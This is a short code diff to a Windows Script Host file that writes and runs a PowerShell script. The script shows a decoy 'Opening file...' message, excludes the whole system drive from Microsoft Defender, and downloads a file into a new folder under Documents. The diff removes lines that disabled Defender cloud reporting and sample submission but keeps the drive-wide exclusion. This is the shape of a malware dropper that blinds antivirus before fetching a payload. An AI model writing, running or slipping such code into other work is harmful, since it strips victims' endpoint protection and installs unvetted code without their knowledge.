@@ -16,11 +16,7 @@ var psPath = tempFolder + "\\" + psFilename;
 var psContent =
 'Write-Output "Opening file...";\n' +
 'Try {\n' +
-'    # Defender changes (keep as-is; run only in test environments)\n' +
-'    Set-MpPreference -MAPSReporting 0;\n' +
-'    Set-MpPreference -SubmitSamplesConsent 2;\n' +
 '    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
-'    Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
 '\n' +
 '    # Create a unique folder inside Documents and download the file there\n' +
 '    $docs = [Environment]::GetFolderPath("MyDocuments");\n' +
@@ -63,6 +59,7 @@ try {
 }
 
 WScript.Quit(0);
+
 
 
 
